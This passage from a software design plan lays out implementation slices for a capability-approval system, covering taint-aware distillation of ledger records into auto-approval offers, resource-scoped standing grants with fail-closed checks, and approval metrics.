  This slice reads existing WAL records. A missing `taintOrigins` reads as "taint
  unknown," so a taint-relevant shape returns "cannot distill" until Slice 2; and
  because the bound resource valuation is not recorded until Slice 2, a capability
  with a `_REGISTRY` resource order returns "cannot distill (resource scope
  unrecorded)" until then, fail-closed, exactly parallel to the taint dimension.
  Bare-token capabilities (no resource order) distill fully here. The slice
  produces offers as pure data, applies no policy, and so cannot widen authority.
  It ships detection on the corrected resource-scoped key, the typed diff, the
  blast radius, and the negative-guarantee fold, all pure and testable against
  ledger fixtures.

### Slice 2, recording, enforcement, and the operator surface

  * `src/revl/mcp/approval.py`: `_classify_direct` / `build_ticket` bind the
    runtime resource args into the crossing capability, turning bare
    `gateway.send` into `gateway.send(host="api.stripe.com")` at ticket time (the
    registered-resource projection via `cap_order`), so the ticket and the ledger
    carry structured targets, not just an `argsDigest` hash (§6 N1).
  * `backends/python/replay.py`: extend `record_approval_granted` with
    `taintOrigins` from the crossing's hosted-tier post-endorsement runtime taint
    at the sink, AND the bound resource valuation of the crossing (the
    registered-resource projection: the `host=` / `path=` / `table=` values that
    actually crossed, not the whole `argsDigest`), additive, no seq change.
  * `backends/python/runtime.py` and `src/revl/mcp/session.py`: load
    `AutoApproveRule`s from the policy into a persistent standing-grant analog,
    matched in `_find_standing_grant` (or a shared-body sibling) with the
    component-glob / realm scope, the **resource-scope `covers` check** (via
    `_cap_covers`), and the taint-subset gate; reuse the consume-before-fire WAL.
    The admission taint gate uses the static floor on runtime-taint-less tiers
    (§2.2, §6 A2 H2 corollary): unknown `taintOrigins` at admission is all five
    origins, never empty. Suspend-on-signature-change including glob-membership
    growth (§6 A1) and the live-operator re-validation (§6 A5) live here.
  * `src/revl/mcp/session.py` and `server.py`: the `distillation_offers`,
    `apply_distillation`, `revoke_distillation` verbs, gated by item-55
    `approve`, with `distillation-applied` / `distillation-revoked` WAL records
    and the attribution fields; carry the mint/revoke ambiguity refusal.
  * `selfhost/emit_py.rvl`: port if the runtime consume path changes; verify the
    per-backend golden tests after the emit change, not just `pytest tests/`.

### Slice 3, the time axis

  * `src/revl/mcp/session.py` `approval_metrics`: add the persisted per-session
    prompts series and `distillationImpact` (before / after per applied rule),
    read from the WAL, with the computed floor (§4). Off-policy stays
    byte-identical (the metric block already returns None with no policy).

The first slice is landable and useful on its own: it turns the ledger into
reviewable typed offers with honest blast radii, gated behind "offer only,"
before any crossing is ever auto-approved.
